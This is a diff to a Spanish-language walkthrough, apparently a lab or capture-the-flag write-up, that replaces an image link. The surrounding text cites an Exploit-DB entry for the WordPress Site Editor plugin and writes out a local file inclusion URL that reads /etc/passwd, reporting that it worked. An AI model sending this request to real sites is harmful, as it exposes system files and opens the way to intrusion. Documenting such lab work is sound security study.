@@ -31,7 +31,8 @@ buscamos sobre el exploit: https://www.exploit-db.com/exploits/44340
 
 y encontré que si en la barra de búsqueda colocamos: http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
 
-![[vulnerabilidad 1.png]]
+![image](https://github.com/user-attachments/assets/d02df419-b597-4b29-8f0d-a1403bd40c07)
+
 
 y nos dio el contenido de "/etc/passwd" 
 
